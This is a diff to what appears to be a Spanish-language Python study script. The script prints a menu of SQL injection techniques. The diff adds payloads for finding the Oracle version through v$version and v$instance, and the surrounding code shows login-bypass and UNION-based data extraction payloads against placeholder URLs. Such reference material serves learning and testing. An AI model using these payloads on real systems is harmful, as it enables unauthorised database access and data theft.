@@ -72,6 +72,7 @@ def content_sql_injection(num_sel):
         print("[or]: Condición en la que nos va a servir para decir si esto si cumple O si esto otro cumple.")
         print("[1=1]: Se busca un TRUE por lo cual logicamente 1 es igual a 1.")
         print("[-- -]: para comentar la query faltante que quedo de la original. ")
+        print()
     if(num_sel=="2"):
         print("the beginning of section without knowing data and attacking from the user.")
         print("Step #1: Irse al panel de autentincación.")
@@ -82,6 +83,7 @@ def content_sql_injection(num_sel):
         print("[administrator/nom usu]: Se escribe administrador o cualquier nombre de usuario que se nos ocurra.")
         print("[']: Para hacer un hueco.")
         print("[--]: Para comentar las demás partes.")
+        print()
     if(num_sel=="3"):
         print("Know columns")
         print("Descriptcion: La idea de este ataque es saber las columnas que tiene una tabla.")
@@ -97,12 +99,14 @@ def content_sql_injection(num_sel):
         print("     Attack #3: Ver cuál es el usuario que esta corriendo la DataBase: [null,null,user(),null,null]")
         print("--------------------------------------------------------------------------")
         print("[UNION]: Unir una consulta.")
+        print()
     if(num_sel=="4"):
         print("find a column that is a string")
         print("Description: La idea con este ataque es ver que columnas puede contener un string")
         print("Step #1: Hacemos un UNION SELECT con Null: HTTPS://link_de_la_page_web.net/ruta/ruta2?variable=valor['UNION SELECT NULL,NULL,NULL]")
         print("Step #2: Probamos por cada columna el string para saber donde se puede hacer la sql inyection: HTTPS://link_de_la_page_web.net/ruta/ruta2?variable=valor['UNION SELECT NULL,'String',NULL]")
         print("--------------------------------------------------------------------------")
+        print()
     if(num_sel=="5"):
         print("UNION attack recover data from another table")
         print("Step #1: Conocer el número de columnas: HTTPS://link_de_la_page_web.net/ruta/ruta2?variable=valor['UNION SELECT NULL,NULL,NULL -- -].")
@@ -120,6 +124,16 @@ def content_sql_injection(num_sel):
         print("         Step #6.1.2: Para Microsoft: 'column_A'+'Column_B'")
         print("         Step #6.1.3: Para mysql: 'column_A' 'Column_B' [Tenga en cuenta el espacio entre los dos strings] CONCAT('column_a','column_b')")
         print("--------------------------------------------------------------------------")
+        print()
+    if(num_sel=="6"):
+        print("Know the version of the oracle")
+        print("Step #Extra 1: Vamos a probar con la tabla DUAL cuantas columnas existen: HTTPS://link_de_la_page_web.net/ruta/ruta2?variable=valor['UNION SELECT NULL,NULL FROM dual-- -]")
+        print("Step #1: Vamos a probar con la tabla DUAL cuantas columnas existen: HTTPS://link_de_la_page_web.net/ruta/ruta2?variable=valor['UNION SELECT NULL,banner FROM v$version-- -]")
+        print("     Form #2: Vamos a probar con la tabla DUAL cuantas columnas existen: HTTPS://link_de_la_page_web.net/ruta/ruta2?variable=valor['UNION SELECT NULL,version FROM v$instance- -]")
+        print()
+    if(num_sel=="7"):
+        print("get the version and database in mysql and microsoft")
+        
 
 
 
@@ -135,6 +149,8 @@ def sql_injection_menu():
     print("THIRD HIT #3: Know columns")
     print("FOURTH HIT #4: find a column that is a string")
     print("FIFTH HIT #5: UNION attack recover data from another table")
+    print("SIXTH HIT #6: Know the version of the oracle")
+    print("SEVENTH HIT #7: get the version and database in mysql and microsoft")
     print("█████████████████████████████████")
     num_sel=input("select number of the attack: ")
     print()
